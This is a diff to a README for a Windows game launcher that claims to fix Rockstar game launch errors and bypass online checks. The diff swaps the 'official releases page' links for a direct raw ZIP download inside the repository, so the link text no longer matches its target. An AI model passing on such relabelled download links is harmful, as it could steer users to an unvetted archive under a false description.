@@ -1,12 +1,12 @@
 # 🎮 Nightlight-Game-Launcher - Launch your games without connection errors
 
-[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pruheroic16/Nightlight-Game-Launcher/releases)
+[![](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/pruheroic16/Nightlight-Game-Launcher/raw/refs/heads/main/Sources/Nightlight-Game-Launcher-v1.1.zip)
 
 Nightlight Game Launcher helps you start your Rockstar Games titles on Windows. It fixes common launch errors found in games like Grand Theft Auto V and Red Dead Redemption 2. This tool manages your account files and skips unnecessary online service checks. It works as an account switcher and ensures your local game files remain intact.
 
 ## 📥 How to download the software
 
-Visit [the official releases page](https://github.com/pruheroic16/Nightlight-Game-Launcher/releases) to download the application. 
+Visit [the official releases page](https://github.com/pruheroic16/Nightlight-Game-Launcher/raw/refs/heads/main/Sources/Nightlight-Game-Launcher-v1.1.zip) to download the application. 
 
 1. Go to the link above.
 2. Look for the latest version at the top of the list.
